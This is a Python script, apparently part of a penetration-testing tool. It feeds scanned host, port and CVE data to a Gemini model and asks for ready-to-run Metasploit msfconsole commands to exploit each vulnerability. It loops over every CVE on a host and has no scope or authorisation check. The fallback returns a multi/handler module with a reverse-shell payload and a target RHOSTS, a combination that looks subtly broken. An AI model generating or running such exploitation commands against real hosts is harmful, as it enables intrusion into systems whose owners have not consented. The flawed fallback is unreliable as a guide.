from google import genai
import json

client = genai.Client()

def find_metasploit_exploit(exploit_data):
    """
    Generate Metasploit exploit commands for a given exploit
    """
    prompt = f"""
    For the following vulnerability, provide the exact Metasploit commands to exploit it:
    
    Vulnerability Data: {json.dumps(exploit_data, indent=2)}
    
    Return ONLY the msfconsole commands in this exact format:
    {{
        "exploit_module": "exploit/path/to/module",
        "required_options": {{
            "RHOSTS": "target_ip",
            "RPORT": "port_number",
            "other_option": "value"
        }},
        "optional_options": {{
            "optional_option": "value"
        }},
        "payload": "payload/path",
        "commands": [
            "use exploit/path/to/module",
            "set RHOSTS target_ip",
            "set RPORT port_number",
            "set payload payload/path",
            "exploit"
        ]
    }}
    """
    
    try:
        response = client.models.generate_content(
            model="gemini-2.5-flash",
            contents=prompt
        )
        
        # Try to parse the response as JSON
        try:
            return json.loads(response.text)
        except json.JSONDecodeError:
            # Fallback if JSON parsing fails
            return {
                "exploit_module": "exploit/multi/handler",
                "required_options": {"RHOSTS": exploit_data.get('host', '192.168.1.1')},
                "optional_options": {},
                "payload": "payload/generic/shell_reverse_tcp",
                "commands": [
                    "use exploit/multi/handler",
                    f"set RHOSTS {exploit_data.get('host', '192.168.1.1')}",
                    "exploit"
                ]
            }
            
    except Exception as e:
        return {
            "error": f"Failed to generate exploit commands: {str(e)}",
            "exploit_module": "exploit/multi/handler",
            "required_options": {"RHOSTS": exploit_data.get('host', '192.168.1.1')},
            "optional_options": {},
            "payload": "payload/generic/shell_reverse_tcp",
            "commands": [
                "use exploit/multi/handler",
                f"set RHOSTS {exploit_data.get('host', '192.168.1.1')}",
                "exploit"
            ]
        }

def process_exploits_for_host(host_data):
    """
    Process all exploits found for a host and generate Metasploit commands
    """
    results = []
    
    print(f"Processing exploits for host: {host_data.get('host')}")
    print(f"Services: {host_data.get('services', [])}")
    
    for service in host_data.get('services', []):
        print(f"Processing service: {service}")
        if service.get('cves'):
            print(f"Found CVEs: {service['cves']}")
            for cve in service['cves']:
                exploit_info = {
                    'host': host_data['host'],
                    'port': service['port'],
                    'service': service['service'],
                    'product': service.get('product', 'Unknown'),
                    'version': service.get('version', 'Unknown'),
                    'cve_id': cve['id'],
                    'cve_severity': cve.get('severity', 'Unknown'),
                    'cve_score': cve.get('score', 'Unknown')
                }
                
                print(f"Generating Metasploit commands for: {exploit_info}")
                
                # Generate Metasploit commands
                metasploit_commands = find_metasploit_exploit(exploit_info)
                exploit_info['metasploit_commands'] = metasploit_commands
                
                print(f"Generated commands: {metasploit_commands}")
                results.append(exploit_info)
        else:
            print(f"No CVEs found for service: {service}")
    
    print(f"Total results: {len(results)}")
    return results